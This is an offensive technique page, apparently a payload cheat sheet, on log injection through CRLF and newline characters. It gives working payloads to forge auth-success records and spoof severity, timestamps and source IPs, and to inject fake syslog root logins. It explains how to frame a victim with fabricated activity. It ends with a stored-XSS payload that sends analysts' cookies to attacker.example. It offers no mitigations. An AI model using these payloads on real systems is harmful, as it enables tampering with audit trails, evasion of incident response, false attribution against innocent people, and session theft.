---
title: "Newline forging: splitting one log call into two entries with CRLF"
description: "Injecting CRLF or a bare newline into logged input so a single log statement emits two lines, forging a second log record with attacker-chosen timestamp, severity, source IP, and message."
keywords:
  - log injection
  - newline forging
  - CRLF injection
  - log forging
  - syslog injection
  - log poisoning
---

# Newline forging

Line-oriented logs use a newline as the record separator, so one logical log statement is one physical line. When attacker input containing a newline (`\n`, `%0a`) or a carriage-return/line-feed pair (`\r\n`, `%0d%0a`) is written into that line unescaped, the log file now contains two lines where the application wrote one. The second line is entirely attacker-controlled and is indistinguishable from a genuine record to anything that parses the file line by line.

## The primitive

A typical access or auth log statement interpolates a field straight into a format string:

```
logger.info("login failed for user=" + username + " from " + clientIp)
```

The on-disk line looks like:

```
2026-10-01T09:14:22Z INFO login failed for user=bob from 203.0.113.9
```

Set the `username` field to a value that carries a newline followed by a complete fake record, URL-encoding the CRLF in the HTTP request:

```
bob%0a2026-10-01T09:14:25Z INFO login succeeded for user=admin from 10.0.0.5
```

After the logger writes and the bytes are decoded, the file holds two lines:

```
2026-10-01T09:14:22Z INFO login failed for user=bob
2026-10-01T09:14:25Z INFO login succeeded for user=admin from 10.0.0.5 from 203.0.113.9
```

The forged line carries an attacker-chosen timestamp, severity, message, and source IP. One detail to note: the genuine trailing field (here ` from 203.0.113.9`, interpolated *after* the attacker's value) is concatenated onto the end of the forged line, so it appears as a leftover suffix. The attacker either lives with that harmless remnant or shapes the payload so the trailing value lands somewhere ignorable (for example as part of a field the reader does not parse).

## Forging specific fields

Because you control the whole second line, you choose every field the format exposes.

Fake a successful login to bury a real one or to frame an account:

```
victim%0d%0a2026-10-01T03:00:01Z INFO auth success user=victim mfa=bypassed ip=198.51.100.7
```

Spoof severity so a monitoring rule mis-triages. Downgrade your own noisy activity to `DEBUG`, or raise a decoy to `CRITICAL` to flood responders:

```
x%0aLEVEL=DEBUG scan complete, no findings
x%0aLEVEL=CRITICAL database corruption detected on shard-3
```

Spoof the source IP to point attribution at a third party or an internal host that defenders trust:

```
x%0a2026-10-01T09:20:00Z WARN repeated 401 from 8.8.8.8
```

## Injecting a syslog prefix

When logs are shipped over syslog or written in syslog format, prepend a full priority and header so the forged line is accepted as a distinct message. A syslog line begins with a priority value in angle brackets, then timestamp, host, and tag:

```
x%0a<34>Oct  1 09:21:00 app01 sshd[4111]: Accepted password for root from 192.0.2.10 port 54321 ssh2
```

The `<34>` encodes facility `auth` with severity `crit`, so the forged event lands in the authentication stream with high priority.

## Framing another user

Chaining the above, a single injected field can manufacture a trail of activity attributed to a chosen victim: failed logins, privilege changes, or file access lines that name their account and a plausible IP, timed to sit near a real incident so an investigator reads them as corroboration.

## Stored XSS in log viewers

Many teams read logs through a web console (Kibana, Grafana, a custom dashboard). If that console renders log content as HTML without encoding it, a newline-forged line that contains markup becomes stored cross-site scripting that fires when an analyst views the entry:

```
x%0a2026-10-01T09:25:00Z INFO <script>fetch('//attacker.example/c?'+document.cookie)</script>
```

The log file is the delivery vector and the analyst's authenticated browser session is the target.

## Encoding notes

- In HTTP, inject the break as `%0a` (LF), `%0d%0a` (CRLF), or `%0d` (CR) depending on what the framework decodes and what the log writer treats as a line end.
- Bare `%0d` alone can overwrite the start of the visible line on terminal `tail`, hiding the real prefix behind your text.
- Where input is JSON, a literal `\n` inside a string value is decoded to a real newline by the time it reaches a plaintext logger.

## References

- [OWASP: Log Injection](https://owasp.org/www-community/attacks/Log_Injection)
- [PayloadsAllTheThings: CRLF Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection)
